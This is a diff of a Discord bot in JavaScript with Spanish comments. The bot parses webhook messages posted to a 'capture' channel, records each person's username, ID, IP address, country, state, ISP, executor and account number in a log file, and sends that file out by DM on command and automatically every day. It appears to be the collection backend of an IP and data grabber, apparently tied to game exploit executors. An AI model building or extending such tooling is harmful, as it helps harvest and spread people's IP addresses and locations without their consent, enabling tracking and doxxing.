@@ -16,68 +16,84 @@ const client = new Client({
     ]
 });
 
-// ===============================
+// Cache temporal para unir mensaje de texto + embed
+let pending = {};  // pending[webhookMessageID] = { usuario, id, display }
+
+// =======================================
 // 📌 PARSEAR MENSAJE DEL WEBHOOK
-// ===============================
+// =======================================
 client.on("messageCreate", (msg) => {
 
-    // aceptar mensajes de webhook, ignorar bots reales
-    if (!msg.webhookId && msg.author.bot) return;
+    if (!msg.webhookId) return;         // solo mensajes del webhook
     if (msg.channel.id !== CAPTURE_CHANNEL) return;
-    if (!msg.embeds.length) return;
 
-    const embed = msg.embeds[0];
+    // ===============================
+    // 🟩 1. MENSAJE DE TEXTO (content)
+    // ===============================
+    if (!msg.embeds.length && msg.content.includes("USUARIO:")) {
 
-    // -------------------------------
-    // 1. EXTRAER Nombre / Display
-    // -------------------------------
-    let Nombre = msg.content.match(/USUARIO:\s([^|]+)/)?.[1]?.trim() || "N/A";
-    let Display = msg.content.match(/DISPLAY:\s(.+)$/)?.[1]?.trim() || "N/A";
+        const usuario = msg.content.match(/USUARIO:\s([^|]+)/)?.[1]?.trim() || "N/A";
+        const id = msg.content.match(/ID:\s(\d+)/)?.[1]?.trim() || "N/A";
+        const display = msg.content.match(/DISPLAY:\s(.+)/)?.[1]?.trim() || "N/A";
 
-    // -------------------------------
-    // 2. EXTRAER IP
-    // -------------------------------
-    let IP =
-        embed.fields[0]?.value.match(/```(.+?)```/)?.[1] ||
-        "N/A";
+        pending[msg.id] = {
+            usuario,
+            id,
+            display,
+            timestamp: Date.now()
+        };
 
-    // -------------------------------
-    // 3. EXTRAER UBICACIÓN
-    // -------------------------------
-    let Pais =
-        embed.fields[1]?.value.match(/País:\s+```(.*?)```/)?.[1] ||
-        "N/A";
+        return;
+    }
 
-    let Estado =
-        embed.fields[1]?.value.match(/Estado:\s+```(.*?)```/)?.[1] ||
-        "N/A";
+    // =======================================
+    // 🟦 2. MENSAJE CON EMBED (datos técnicos)
+    // =======================================
+    if (msg.embeds.length) {
 
-    let ISP =
-        embed.fields[1]?.value.match(/ISP:\s*(.+)/)?.[1]?.trim() ||
-        "N/A";
+        // encontrar un mensaje de texto previo del mismo webhook
+        let matchedKey = null;
+        for (let key in pending) {
+            if (Date.now() - pending[key].timestamp < 2000) { // 2 segundos
+                matchedKey = key;
+                break;
+            }
+        }
 
-    // -------------------------------
-    // 4. EXTRAER SISTEMA
-    // -------------------------------
-    let Executor =
-        embed.fields[2]?.value.match(/Executor:\s*(.+)/)?.[1]?.trim() ||
-        "N/A";
+        if (!matchedKey) return; // no hay mensaje emparejable
 
-    let Cuenta =
-        embed.fields[2]?.value.match(/Cuenta:\s*(\d+)/)?.[1] ||
-        "N/A";
+        let { usuario, id, display } = pending[matchedKey];
+        delete pending[matchedKey];
 
-    // -------------------------------
-    // 5. GUARDAR LÍNEA
-    // -------------------------------
-    const linea = `${Nombre} | ${Display} | ${IP} | ${Pais} | ${Estado} | ${ISP} | ${Executor} | ${Cuenta}\n`;
+        const embed = msg.embeds[0];
 
-    fs.appendFileSync(LOG_FILE, linea, "utf8");
+        // IP
+        let IP = embed.fields[0]?.value.match(/```(.+?)```/)?.[1] || "N/A";
+
+        // País / Estado / Ciudad / ISP
+        let UB = embed.fields[1]?.value || "";
+
+        let Pais = UB.match(/País:\s+```(.*?)```/)?.[1] || "N/A";
+        let Estado = UB.match(/Estado:\s+```(.*?)```/)?.[1] || "N/A";
+        let ISP = UB.match(/ISP:\s*(.+)/)?.[1]?.trim() || "N/A";
+
+        // Executor / Cuenta
+        let SYS = embed.fields[2]?.value || "";
+
+        let Executor = SYS.match(/Executor:\s*(.+)/)?.[1]?.trim() || "N/A";
+        let Cuenta = SYS.match(/Cuenta:\s*(\d+)/)?.[1] || "N/A";
+
+        // Línea final
+        const linea = `${usuario} | ${display} | ${IP} | ${Pais} | ${Estado} | ${ISP} | ${Executor} | ${Cuenta}\n`;
+
+        fs.appendFileSync(LOG_FILE, linea, "utf8");
+    }
 });
 
-// ===============================
+
+// =======================================
 // 📌 COMANDO MANUAL: !loggs
-// ===============================
+// =======================================
 client.on("messageCreate", async (msg) => {
     if (msg.content !== "!loggs") return;
 
@@ -85,33 +101,28 @@ client.on("messageCreate", async (msg) => {
         return msg.reply("❌ No tienes permisos.");
 
     if (!fs.existsSync(LOG_FILE))
-        return msg.reply("No hay logs guardados.");
+        return msg.reply("No hay logs.");
 
-    const file = new AttachmentBuilder(LOG_FILE);
+    await msg.author.send({
+        content: "📄 Logs actuales:",
+        files: [new AttachmentBuilder(LOG_FILE)]
+    });
 
-    await msg.author.send({ content: "📄 Logs actuales:", files: [file] });
     msg.reply("📬 Enviados por DM.");
 });
 
-// ===============================
+// =======================================
 // 📌 ENVÍO AUTOMÁTICO DIARIO
-// ===============================
-function enviarLogsDiarios() {
+// =======================================
+setInterval(() => {
     if (!fs.existsSync(LOG_FILE)) return;
-
     const canal = client.channels.cache.get(SEND_LOGS_CHANNEL);
     if (!canal) return;
 
-    const file = new AttachmentBuilder(LOG_FILE);
-
     canal.send({
-        content: "📊 **Reporte diario de registros:**",
-        files: [file]
+        content: "📊 **Reporte diario**:",
+        files: [new AttachmentBuilder(LOG_FILE)]
     });
-}
+}, 24 * 60 * 60 * 1000);
 
-// ejecutar cada 24 horas
-setInterval(enviarLogsDiarios, 24 * 60 * 60 * 1000);
-
-// ===============================
 client.login(TOKEN);
